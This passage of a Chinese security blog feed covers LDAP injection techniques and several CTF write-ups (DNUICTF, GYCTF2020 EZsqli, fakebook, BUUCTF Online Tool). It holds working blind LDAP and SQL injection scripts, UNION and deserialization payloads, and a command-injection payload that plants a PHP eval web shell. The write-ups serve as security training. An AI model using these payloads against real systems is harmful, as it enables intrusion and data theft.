</code>,构造value=<code>xxx)(injected_filter)</code></p><p>现在完整的过滤器就变成了<code>(&amp;(attribute=xxx)(injected_filter))(sec_filter))</code></p><p>此时OpenLDAP会忽略第一个过滤器闭合后的所有字符</p><p>即实际上起到作用的部分仅为<code>(&amp;(attribute=xxx)(injected_filter))</code></p><h3 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h3><p>部分情况下应用框架会检测搜索器语法是否正确</p><p>如<code>(&amp;(attribute=value)(sec_filter))  </code>，构造value=<code>xxx)(injected_filter)(&amp;(1=0</code></p><p>那么有<code>(&amp;(attribute=xxx)(injectd_filter))(&amp;(1=0)(sec_filter))</code></p><h3 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a>示例3</h3><p>ADAM下不允许有两个过滤器，那么对<code>(&amp;(attribute=value)(sec_filter))</code></p><p>可以构造value=<code>xxx)(injected_filter</code></p><p>得到<code>(&amp;(attribute=xxx)(injectd_filter)(sec_filter))</code></p><h2 id="注入利用方式"><a href="#注入利用方式" class="headerlink" title="注入利用方式"></a>注入利用方式</h2><h3 id="绕过访问控制"><a href="#绕过访问控制" class="headerlink" title="绕过访问控制"></a>绕过访问控制</h3><p>假设过滤器为<code>(&amp;(param1=value1)(param2=value2))</code></p><p>利用(&amp;)永真的特性,构造value1=<code>xxx)(&amp;)</code>(注：xxx应当为一个有效的值)</p><p>得到<code>(&amp;(param1=value1)(&amp;))(param2=value2))</code></p><p>此时服务器只处理第一个搜索器，该搜索器为真，成功绕过</p><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>假设查询语句为<code>(&amp;(param=name)(security_level=low))</code>,该语句只返回低安全等级的数据</p><p>构造name=<code>xxx)(security_level=*)</code></p><p>得到<code>(&amp;(param=name)(security_level=*))(security_level=low))</code></p><p>即可查询所有安全等级的文档</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>假设查询语句为<code>(|(type=rsc1)(type=rsc2))</code></p><p>构造rsc1=<code>xxx)(uid=*)</code>,得到<code>(|(type=rsc1)(uid=*))(type=rsc2)</code></p><p>直接返回所有的用户对象</p><h2 id="LDAP盲注"><a href="#LDAP盲注" class="headerlink" title="LDAP盲注"></a>LDAP盲注</h2><p>LDAP的盲注原理与sql盲注大致相同，主要是利用通配符<code>*</code>来构造出特殊的查询语句，使得查询返回结果只能为true/false，再编写脚本来爆出需要的信息</p><p>小技巧：</p><p>利用<code>*char*</code>的格式可以先做一次字符集的削减，该格式被用来查询值中是否包含有通配符之间的字符，回显为true则保留该字符，为false则丢弃该字符，以达到缩小盲注字符范围的效果</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.anquanke.com/post/id/212186">浅谈LDAP注入-安全客</a></p><p><a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html">LDAP注入与防御剖析-r00tgrok</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;LDAP简介&quot;&gt;&lt;a href=&quot;#LDAP简介&quot; class=&quot;headerlink&quot; title=&quot;LDAP简介&quot;&gt;&lt;/a&gt;LDAP简介&lt;/h1&gt;&lt;h2 id=&quot;什么是LDAP&quot;&gt;&lt;a href=&quot;#什么是LDAP&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DNUICTF部分题目复现</title>
    <link href="https://wuyusanhua2021.github.io/2021/12/06/DNUICTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://wuyusanhua2021.github.io/2021/12/06/DNUICTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-12-06T11:46:16.000Z</published>
    <updated>2022-01-06T05:20:10.631Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Web-odd-upload"><a href="#Web-odd-upload" class="headerlink" title="Web-odd_upload"></a>Web-odd_upload</h3><p><strong>smarty模板覆盖</strong></p><p>在./templates/index.tpl找到主页的模板文件，在最后可以看到有一个对footer.tpl文件的包含语句</p><p><img src="/2021/12/06/DNUICTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20211206194903343.png" alt="image-20211206194903343"></p><p>进入footer发现什么也没有，这里可以利用文件上传来上传一个包含phpinfo命令的footer.tpl文件，来覆盖原来的footer.tpl</p><p><img src="/2021/12/06/DNUICTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20211206195147034.png" alt="image-20211206195147034"></p><p>再次返回主页，即可找到flag</p><p><img src="/2021/12/06/DNUICTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20211206195231132.png" alt="image-20211206195231132"></p><h3 id="Web-easyinject"><a href="#Web-easyinject" class="headerlink" title="Web-easyinject"></a>Web-easyinject</h3><p><strong>ldap盲注</strong></p><p>用网页源码给的账户登录，得到hint：flag是一个特殊的邮箱地址用户名。它是一个账户的属性，目录中有多个账户，flag由 a-z0-9_ 组成。</p><p>在fuzz返回的报错信息中可以得知登陆系统使用了ldap</p><p><img src="/2021/12/06/DNUICTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20211209185217295.png" alt="image-20211209185217295"></p><p>盲注脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://47.106.172.144:2333/&#x27;</span></span><br><span class="line">string = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz_&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;_&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        payload = <span class="string">&quot;?user=guest)(mail=*&quot;</span> + result + j + <span class="string">&quot;*&amp;pass=EC77k8RHquAMLKAX&quot;</span></span><br><span class="line">        re = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;查询用户不唯一&quot;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            result += j</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        payload = <span class="string">&quot;?user=guest)(mail=*&quot;</span> + j + result + <span class="string">&quot;*&amp;pass=EC77k8RHquAMLKAX&quot;</span></span><br><span class="line">        re = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;查询用户不唯一&quot;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            result = j + result</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注出来的结果包上flag{}即可</p><h3 id="Misc-压缩包压缩包压缩包压缩包"><a href="#Misc-压缩包压缩包压缩包压缩包" class="headerlink" title="Misc-压缩包压缩包压缩包压缩包"></a>Misc-压缩包压缩包压缩包压缩包</h3><p>zip压缩包的循环解压，解压密码即是文件名，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">zippath = <span class="string">r&#x27;C:/CTF/&#x27;</span> + <span class="string">&#x27;yasuobao.zip&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        temp = zipfile.ZipFile(zippath)</span><br><span class="line">        res = re.search(<span class="string">&#x27;[0-9]*&#x27;</span>, temp.namelist()[<span class="number">0</span>])</span><br><span class="line">        passwd = res.group()</span><br><span class="line">        temp.extractall(<span class="string">r&#x27;C:/CTF/&#x27;</span>, pwd=passwd.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        temp.close()</span><br><span class="line">        os.remove(zippath)</span><br><span class="line">        zippath = <span class="string">r&#x27;C:/CTF/&#x27;</span> + temp.namelist()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最后得到一个23333.zip,提示密码为六位数字，直接爆出来，解压得到flag</p><h3 id="Misc-ezsteg"><a href="#Misc-ezsteg" class="headerlink" title="Misc-ezsteg"></a>Misc-ezsteg</h3><p>直接扫二维码，提示是一种常见的隐写，改文件后缀为zip，解压得到_find.png,用<code>stegpy</code>进行解密即可直接得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Web-odd-upload&quot;&gt;&lt;a href=&quot;#Web-odd-upload&quot; class=&quot;headerlink&quot; title=&quot;Web-odd_upload&quot;&gt;&lt;/a&gt;Web-odd_upload&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;smarty模板覆盖&lt;/st</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GYCTF2020 EZsqli Writeup</title>
    <link href="https://wuyusanhua2021.github.io/2021/11/17/GYCTF2020-EZsqli-Writeup/"/>
    <id>https://wuyusanhua2021.github.io/2021/11/17/GYCTF2020-EZsqli-Writeup/</id>
    <published>2021-11-17T12:19:43.000Z</published>
    <updated>2022-01-06T05:20:10.630Z</updated>
    
    <content type="html"><![CDATA[<p>布尔盲注+无列名注入，屏蔽了相当多的关键字😓(or,if,and,information……)</p><p>题目只给了一个注入点，burp爆了一下，可以看到很多关键字都被过滤了</p><img src="/2021/11/17/GYCTF2020-EZsqli-Writeup/image-20211117201034083-16371516365892.png" alt="image-20211117201034083" style="zoom:50%;"><img src="/2021/11/17/GYCTF2020-EZsqli-Writeup/image-20211117201013528-16371516365881.png" alt="image-20211117201013528" style="zoom:50%;"><p>手动注<code>id=1</code>，返回<code>Nu1L</code>,</p><p>注<code>id=2</code>返回<code>V&amp;N</code></p><p>注<code>id=1&amp;&amp;1=1</code>返回<code>Nu1L</code></p><p>注<code>id=1&amp;&amp;1=0</code>返回<code>Error Occured When Fetch Result.</code></p><p>注<code>id=2||1=0</code>返回<code>V&amp;N</code></p><p>推测应该是条件为真时返回<code>Nu1L</code>,为假时返回<code>V&amp;N</code>，可以盲注，但是information_schema被过滤，无法使用常规的方式盲注，这里就要用到无列名注入</p><p>[]: <a href="https://blog.csdn.net/weixin_46330722/article/details/109605941">https://blog.csdn.net/weixin_46330722/article/details/109605941</a></p><p>同时MySQL5.7后新增了sys库，可以通过这个库找到表名</p><blockquote><p>sys.schema_table_statistics</p><p>sys.schema_table_statistics_with_buffer</p><p>sys.x$schema_flattened_keys</p></blockquote><p>盲注脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://531b7143-ac5d-43ab-babc-358f7d2439f0.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_name</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        l = <span class="number">32</span></span><br><span class="line">        r = <span class="number">128</span></span><br><span class="line">        mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> (l &lt; r):</span><br><span class="line">            payload = <span class="string">&#x27;2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            params = &#123;<span class="string">&#x27;id&#x27;</span> : payload&#125;</span><br><span class="line">            re = requests.post(url, params)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = mid</span><br><span class="line">            mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid &lt;= <span class="number">33</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            tmp = result + <span class="built_in">chr</span>(j)</span><br><span class="line">            payload = <span class="string">&quot;2||((select 1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="built_in">format</span>(tmp)</span><br><span class="line">            params = &#123;<span class="string">&#x27;id&#x27;</span> : payload&#125;</span><br><span class="line">            re = requests.post(url, params)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">                result += <span class="built_in">chr</span>(j - <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#table_name()</span></span><br><span class="line">flag()</span><br></pre></td></tr></table></figure><p>爆出flag后转小写即可，最终结果<code>flag&#123;3a86f50d-a6ae-470a-98b1-b2cfeef111bf&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;布尔盲注+无列名注入，屏蔽了相当多的关键字😓(or,if,and,information……)&lt;/p&gt;
&lt;p&gt;题目只给了一个注入点，burp爆了一下，可以看到很多关键字都被过滤了&lt;/p&gt;
&lt;img src=&quot;/2021/11/17/GYCTF2020-EZsqli-Wri</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>攻防世界 fakebook Writeup</title>
    <link href="https://wuyusanhua2021.github.io/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/"/>
    <id>https://wuyusanhua2021.github.io/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/</id>
    <published>2021-11-08T08:13:59.000Z</published>
    <updated>2022-01-06T05:20:09.297Z</updated>
    
    <content type="html"><![CDATA[<p>​    一道结合了SSRF，sql注入，反序列化的题</p><p>​    一个用户注册登录界面，先随便注册一个账号</p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211108163451936.png" alt="image-20211108163451936"></p><p>注册完就直接自动登陆了，进入用户界面后没有什么有用的信息，上边有个注入点不知道该怎么利用，f12看源代码也没有额外提示</p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211108163632419.png" alt="image-20211108163632419"></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211108163813471.png" alt="image-20211108163813471"></p><p>这个时候就靠经验试了试访问<code>robots.txt</code>，发现有用，得到一个备份文件<code>user.php.bak</code>，下载下来修改文件格式查看源码</p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211108164141566.png" alt="image-20211108164141566"></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211108164213944.png" alt="image-20211108164213944"></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211108164225137.png" alt="image-20211108164225137"></p><p>一个处理用户信息的类，突破口在get()函数，函数内部没有对$url做任何的过滤，经典SSRF漏洞</p><p>回到用户界面，先传个万能密码试一试，报错了，同时给出了文件目录</p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211108192329117.png" alt="image-20211108192329117"></p><p>继续利用这个点测试一下,当<code>order by 5</code>时页面返回报错信息</p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109191959948.png" alt="image-20211109191959948"></p><p>注入语句被过滤了，找了找发现是空格给过滤了，同时也看到了回显点为username，开注</p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109192537823.png" alt="image-20211109192537823"></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109193046757.png" alt="image-20211109193046757"></p><p>爆库名：</p><p><code>?no=0++union++select++1,group_concat(schema_name),3,4++from++information_schema.schemata#</code></p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109194428506.png" alt="image-20211109194428506"><p>爆表名：</p><p><code>?no=0++union++select++1,group_concat(table_name),3,4++from++information_schema.tables++where++table_schema=&#39;fakebook&#39;#</code></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109195749356.png" alt="image-20211109195749356"></p><p>爆列名：</p><p><code>?no=0++union++select++1,group_concat(column_name),3,4++from++information_schema.columns++where++table_name=&#39;users&#39;#</code></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109200802447.png" alt="image-20211109200802447"></p><p>前面的参数都是已知的，直接看data：</p><p><code>?no=0++union++select++1,group_concat(data),3,4++from++users#</code></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109201002941.png" alt="image-20211109201002941"></p><p>得到一段序列化后的数据，联系上面的SSRF漏洞，大概是要利用反序列化来构造一个payload，使file伪协议能够顺利执行。</p><p>最后的payload应该是:<code>?no=0++union++select++1,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;%27</code></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109210951723.png" alt="image-20211109210951723"></p><p>此时再查看源码，多出一段base64加密的密文，解密得到flag</p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109211140021.png" alt="image-20211109211140021"></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109211346731.png" alt="image-20211109211346731"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    一道结合了SSRF，sql注入，反序列化的题&lt;/p&gt;
&lt;p&gt;​    一个用户注册登录界面，先随便注册一个账号&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-W</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BUUCTF 2018 Online Tool Writeup</title>
    <link href="https://wuyusanhua2021.github.io/2021/11/06/BUUCTF-2018-Online-Tool-Writeup/"/>
    <id>https://wuyusanhua2021.github.io/2021/11/06/BUUCTF-2018-Online-Tool-Writeup/</id>
    <published>2021-11-06T11:46:16.000Z</published>
    <updated>2022-01-06T05:20:10.740Z</updated>
    
    <content type="html"><![CDATA[<p>打开题目看到一段php代码</p><p><img src="/2021/11/06/BUUCTF-2018-Online-Tool-Writeup/image-20211107232029070.png" alt="image-20211107232029070"></p><p>一边看一边百度，发现<img src="/2021/11/06/BUUCTF-2018-Online-Tool-Writeup/image-20211107232049472.png" alt="image-20211107232049472">处有RCE漏洞</p><p>两个函数的官方文档如下</p><p><img src="/2021/11/06/BUUCTF-2018-Online-Tool-Writeup/image-20211107232218442.png" alt="image-20211107232218442"></p><p><img src="/2021/11/06/BUUCTF-2018-Online-Tool-Writeup/image-20211107232317911.png" alt="image-20211107232317911"></p><p>通过arc-&gt;cmd的流程处理host变量，会导致host变量中间出现 \ 以及最后出现未配对的 ’ ，从而影响到命令的执行结果，示例如下：</p><blockquote><ol><li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li><li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li><li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a></li><li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl ·172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为a=1’</li></ol></blockquote><p>结合题目所给代码最后一句<code>echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</code>猜测本题应该是通过利用这个漏洞构造一个payload来执行一些命令。</p><p>由cmd函数的官方文档可知，| &amp; 等符号均被过滤掉，没有机会利用，此时可以考虑一下nmap中有没有可以利用的参数，查询一遍nmap参数后，发现一个<code>nmap xxxxx -oG result.xxx </code>可以用来将输出写成特定的格式，有机会通过该参数构造一句话木马来进行上传。</p><p>于是构造payload:<code>?host=&#39; &lt;?php @eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php &#39;</code>(注意有空格，不加会导致上传的<code>shell.php</code>文件名变成<code>shell.php\&#39;</code>)</p><p>经过arc函数处理后payload:<code>?host=&#39;&#39;\&#39; &#39;&lt;?php @eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php&#39; \&#39;&#39;&#39;</code></p><p>经过cmd函数处理后payload:<code>?host=&#39;&#39;\\&#39; &#39;&lt;?php @eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php&#39; \\&#39;&#39;\&#39;</code></p><p>经过拼接后完整指令为：<code>nmap -T5 -sT -Pn --host-timeout 2 -F \ &lt;?php @eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php \&#39;</code></p><p>传入host后得到<img src="/2021/11/06/BUUCTF-2018-Online-Tool-Writeup/image-20211107232407964.png" alt="image-20211107232407964"></p><p>题目代码中有mkdir与chdir两个函数，上传的木马应该是被存储到了用sandbox新建的目录下，用蚁剑连接</p><p><img src="/2021/11/06/BUUCTF-2018-Online-Tool-Writeup/image-20211107232526316.png" alt="image-20211107232526316"></p><p>在目录中找到flag<img src="/2021/11/06/BUUCTF-2018-Online-Tool-Writeup/image-20211107232540630.png" alt="image-20211107232540630"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开题目看到一段php代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/11/06/BUUCTF-2018-Online-Tool-Writeup/image-20211107232029070.png&quot; alt=&quot;image-20211107232029070&quot;&gt;&lt;/p</summary>
      
    
    
    
    
  </entry>
  
</feed>
